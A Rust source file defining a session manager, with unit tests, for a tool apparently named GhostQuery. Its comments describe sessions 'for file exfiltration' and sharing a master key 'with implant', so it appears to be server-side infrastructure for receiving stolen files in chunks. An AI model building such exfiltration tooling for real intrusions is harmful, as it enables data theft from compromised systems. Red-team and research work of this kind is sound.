//! Session manager for handling multiple concurrent sessions.

use parking_lot::RwLock;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};

use crate::common::error::{GhostQueryError, Result};
use crate::common::types::{FileHash, SessionId, SessionMetadata};
use crate::crypto::keys::KeyManager;
use crate::session::buffer::ChunkBuffer;
use crate::session::state::{SessionState, SessionStateMachine};

/// A single session with all its state
pub struct Session {
    /// State machine for lifecycle management
    pub state_machine: SessionStateMachine,
    /// Chunk buffer for data management
    pub buffer: ChunkBuffer,
    /// Key manager for this session
    pub keys: KeyManager,
    /// Creation time
    pub created_at: Instant,
    /// Last activity time
    pub last_activity: Instant,
}

impl Session {
    /// Create a new session
    pub fn new(metadata: SessionMetadata, master_key: &[u8; 32]) -> Result<Self> {
        let mut state_machine = SessionStateMachine::new();
        state_machine.allocate(metadata)?;

        let keys = KeyManager::from_key(*master_key);

        Ok(Self {
            state_machine,
            buffer: ChunkBuffer::new(),
            keys,
            created_at: Instant::now(),
            last_activity: Instant::now(),
        })
    }

    /// Update last activity timestamp
    pub fn touch(&mut self) {
        self.last_activity = Instant::now();
    }

    /// Check if session has expired
    pub fn is_expired(&self, timeout: Duration) -> bool {
        self.last_activity.elapsed() > timeout
    }

    /// Get session state
    pub fn state(&self) -> SessionState {
        self.state_machine.state()
    }

    /// Get session ID
    pub fn id(&self) -> Option<SessionId> {
        self.state_machine.session_id()
    }
}

/// Manager for multiple concurrent sessions
pub struct SessionManager {
    /// Active sessions indexed by session ID
    sessions: RwLock<HashMap<SessionId, Arc<RwLock<Session>>>>,
    /// Master key manager
    master_keys: KeyManager,
    /// Session timeout duration
    timeout: Duration,
    /// Maximum concurrent sessions
    max_sessions: usize,
}

impl SessionManager {
    /// Create a new session manager
    pub fn new() -> Self {
        Self {
            sessions: RwLock::new(HashMap::new()),
            master_keys: KeyManager::new(),
            timeout: Duration::from_secs(3600), // 1 hour default
            max_sessions: 100,
        }
    }

    /// Create with custom settings
    pub fn with_config(master_key: [u8; 32], timeout: Duration, max_sessions: usize) -> Self {
        Self {
            sessions: RwLock::new(HashMap::new()),
            master_keys: KeyManager::from_key(master_key),
            timeout,
            max_sessions,
        }
    }

    /// Create a new session for file exfiltration
    pub fn create_session(
        &self,
        file_hash: FileHash,
        total_chunks: u32,
        chunk_size: usize,
        file_size: u64,
    ) -> Result<SessionId> {
        // Check session limit
        {
            let sessions = self.sessions.read();
            if sessions.len() >= self.max_sessions {
                return Err(GhostQueryError::InternalError(
                    "Maximum sessions exceeded".to_string(),
                ));
            }
        }

        let session_id = SessionId::new();
        let metadata = SessionMetadata::new(session_id, file_hash, total_chunks, chunk_size, file_size);

        let session = Session::new(metadata, self.master_keys.master_key())?;
        let session_arc = Arc::new(RwLock::new(session));

        {
            let mut sessions = self.sessions.write();
            sessions.insert(session_id, session_arc);
        }

        Ok(session_id)
    }

    /// Get a session by ID
    pub fn get_session(&self, id: &SessionId) -> Result<Arc<RwLock<Session>>> {
        let sessions = self.sessions.read();
        sessions
            .get(id)
            .cloned()
            .ok_or_else(|| GhostQueryError::SessionNotFound(id.to_string()))
    }

    /// Remove a session
    pub fn remove_session(&self, id: &SessionId) -> Result<()> {
        let mut sessions = self.sessions.write();
        sessions
            .remove(id)
            .ok_or_else(|| GhostQueryError::SessionNotFound(id.to_string()))?;
        Ok(())
    }

    /// Clean up expired sessions
    pub fn cleanup_expired(&self) -> Vec<SessionId> {
        let mut to_remove = Vec::new();

        {
            let sessions = self.sessions.read();
            for (id, session_arc) in sessions.iter() {
                let session = session_arc.read();
                if session.is_expired(self.timeout) {
                    to_remove.push(*id);
                }
            }
        }

        if !to_remove.is_empty() {
            let mut sessions = self.sessions.write();
            for id in &to_remove {
                sessions.remove(id);
            }
        }

        to_remove
    }

    /// Get all active session IDs
    pub fn active_sessions(&self) -> Vec<SessionId> {
        let sessions = self.sessions.read();
        sessions.keys().copied().collect()
    }

    /// Get session count
    pub fn session_count(&self) -> usize {
        self.sessions.read().len()
    }

    /// Get master key hex (for sharing with implant)
    pub fn master_key_hex(&self) -> String {
        self.master_keys.master_key_hex()
    }

    /// Check if a session exists
    pub fn session_exists(&self, id: &SessionId) -> bool {
        self.sessions.read().contains_key(id)
    }

    /// Get session statistics
    pub fn get_stats(&self) -> SessionManagerStats {
        let sessions = self.sessions.read();

        let mut stats = SessionManagerStats {
            total_sessions: sessions.len(),
            active: 0,
            complete: 0,
            terminated: 0,
            dirty: 0,
        };

        for session_arc in sessions.values() {
            let session = session_arc.read();
            match session.state() {
                SessionState::Active => stats.active += 1,
                SessionState::Complete => stats.complete += 1,
                SessionState::Terminated => stats.terminated += 1,
                SessionState::Dirty => stats.dirty += 1,
                _ => {}
            }
        }

        stats
    }
}

impl Default for SessionManager {
    fn default() -> Self {
        Self::new()
    }
}

/// Statistics about the session manager
#[derive(Debug, Clone)]
pub struct SessionManagerStats {
    pub total_sessions: usize,
    pub active: usize,
    pub complete: usize,
    pub terminated: usize,
    pub dirty: usize,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_create_session() {
        let manager = SessionManager::new();
        let file_hash = FileHash::new([0u8; 32]);

        let session_id = manager.create_session(file_hash, 100, 32, 3200).unwrap();

        assert!(manager.session_exists(&session_id));
        assert_eq!(manager.session_count(), 1);
    }

    #[test]
    fn test_get_session() {
        let manager = SessionManager::new();
        let file_hash = FileHash::new([0u8; 32]);

        let session_id = manager.create_session(file_hash, 100, 32, 3200).unwrap();
        let session = manager.get_session(&session_id).unwrap();

        let session_guard = session.read();
        assert_eq!(session_guard.state(), SessionState::Allocated);
    }

    #[test]
    fn test_remove_session() {
        let manager = SessionManager::new();
        let file_hash = FileHash::new([0u8; 32]);

        let session_id = manager.create_session(file_hash, 100, 32, 3200).unwrap();
        assert!(manager.session_exists(&session_id));

        manager.remove_session(&session_id).unwrap();
        assert!(!manager.session_exists(&session_id));
    }

    #[test]
    fn test_max_sessions() {
        let manager = SessionManager::with_config(
            [0u8; 32],
            Duration::from_secs(3600),
            2, // Only 2 sessions allowed
        );

        let file_hash = FileHash::new([0u8; 32]);

        manager.create_session(file_hash.clone(), 100, 32, 3200).unwrap();
        manager.create_session(file_hash.clone(), 100, 32, 3200).unwrap();

        // Third should fail
        let result = manager.create_session(file_hash, 100, 32, 3200);
        assert!(result.is_err());
    }

    #[test]
    fn test_active_sessions() {
        let manager = SessionManager::new();
        let file_hash = FileHash::new([0u8; 32]);

        let id1 = manager.create_session(file_hash.clone(), 100, 32, 3200).unwrap();
        let id2 = manager.create_session(file_hash, 100, 32, 3200).unwrap();

        let active = manager.active_sessions();
        assert_eq!(active.len(), 2);
        assert!(active.contains(&id1));
        assert!(active.contains(&id2));
    }

    #[test]
    fn test_stats() {
        let manager = SessionManager::new();
        let file_hash = FileHash::new([0u8; 32]);

        manager.create_session(file_hash.clone(), 100, 32, 3200).unwrap();
        manager.create_session(file_hash, 100, 32, 3200).unwrap();

        let stats = manager.get_stats();
        assert_eq!(stats.total_sessions, 2);
    }
}

